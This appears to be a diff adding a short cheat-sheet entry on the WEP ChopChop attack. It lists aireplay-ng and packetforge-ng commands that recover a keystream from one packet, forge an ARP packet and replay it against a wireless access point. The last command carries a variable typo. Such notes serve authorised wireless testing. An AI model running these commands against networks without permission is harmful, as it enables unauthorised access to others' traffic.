@@ -1,0 +1,14 @@
+ChopChop Attack
+
+This is a cryptographic technique that decrypts a WEP packet one byte at a time by exploiting WEP's lack of message integrity,
+allowing you to extract the PRGA keystream from a single packet without knowing the WEP key.
+
+aireplay-ng -4 -b $ap_mac -h $local_mac wlan1mon
+
+Then you need to convert the keystream into a .cap file
+
+packetforge-ng --arp -y [keystream.xor] -a $ap_mac -h $local_mac -k 255.255.255.255 -l 255.255.255.255 -w output.cap
+
+Then replay the .cap file to generate traffic
+
+aireplay-ng -3 -b $ap_mac -h $local_map -r output.cap wlan1mon
